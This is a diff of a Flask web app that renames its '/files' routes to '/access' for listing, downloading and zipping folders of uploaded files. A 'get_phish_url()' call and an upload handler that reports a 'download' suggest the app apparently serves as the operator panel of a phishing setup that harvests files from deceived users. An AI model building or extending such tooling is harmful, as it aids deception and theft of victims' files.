@@ -53,7 +53,7 @@ def upload_files():
 
     return "✅ File Download successfully!"
 
-@app.route('/files')
+@app.route('/access')
 def files_page():
     folders = []
     if os.path.exists(UPLOAD_FOLDER):
@@ -70,7 +70,7 @@ def files_page():
                 })
     return render_template('files.html', folders=folders, phish_url=get_phish_url())
 
-@app.route('/files/<folder_name>')
+@app.route('/access/<folder_name>')
 def view_folder(folder_name):
     folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
     if not os.path.isdir(folder_path):
@@ -85,14 +85,14 @@ def view_folder(folder_name):
             files.append({'name': rel, 'size': size_str})
     return render_template('folder.html', folder_name=folder_name, files=files)
 
-@app.route('/files/<folder_name>/download/<path:filename>')
+@app.route('/access/<folder_name>/download/<path:filename>')
 def download_file(folder_name, filename):
     folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
     if not os.path.isfile(os.path.join(folder_path, filename)):
         abort(404)
     return send_from_directory(folder_path, filename, as_attachment=True)
 
-@app.route('/files/<folder_name>/download-zip')
+@app.route('/access/<folder_name>/download-zip')
 def download_zip(folder_name):
     folder_path = os.path.join(UPLOAD_FOLDER, folder_name)
     if not os.path.isdir(folder_path):
